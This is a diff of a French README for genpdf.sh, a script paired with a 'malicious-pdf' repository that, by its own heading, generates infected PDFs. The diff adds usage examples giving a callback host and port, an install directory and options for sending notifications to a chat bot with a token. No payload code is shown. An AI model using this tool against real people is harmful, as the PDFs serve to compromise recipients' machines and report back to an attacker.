@@ -4,12 +4,27 @@ in use with https://github.com/tucommenceapousser/malicious-pdf
 
 # Generer les pdf infectés
 
-📌 Exemple d’utilisation
+📌 Exemples d'utilisation
+
+### Interactive (par défaut) :
 
 ```bash
-chmod +x genpdf.sh
-./genpdf.sh 127.0.0.1 4545
+./genpdf.sh
 ```
+
+### Non-interactive (automatique) :
+
+```bash
+./genpdf.sh -y --host 127.0.0.1 --port 4545 --base /home/kali/dashpdf --notify --token "123:ABC..." --chat "987654321"
+```
+
+### Non-interactive sans venv et sans mise à jour :
+
+```bash
+./genpdf.sh -y --host my.domain.tld --port 4545 --base /opt/dashpdf --no-venv --no-update
+```
+
+---
 
 Cela va :
 
